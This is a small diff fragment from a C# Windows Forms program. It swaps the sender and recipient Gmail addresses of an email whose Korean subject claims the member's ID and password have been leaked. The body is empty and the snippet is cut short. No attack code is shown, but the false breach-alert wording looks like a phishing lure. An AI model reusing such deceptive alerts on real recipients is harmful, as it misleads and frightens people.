@@ -36,9 +36,9 @@ namespace WindowsFormsApplication1
         {
             MailMessage mail = new MailMessage();
 
-            mail.From = new MailAddress("he115kaka5@gmail.com");
+            mail.From = new MailAddress("be115kaka5@gmail.com");
 
-            mail.To.Add("by3kaka5@gmail.com");
+            mail.To.Add("hy3kaka5@gmail.com");
             mail.Subject = "회원님의 ID/PW가 유출되었습니다.";
             mail.Body = ""
         }
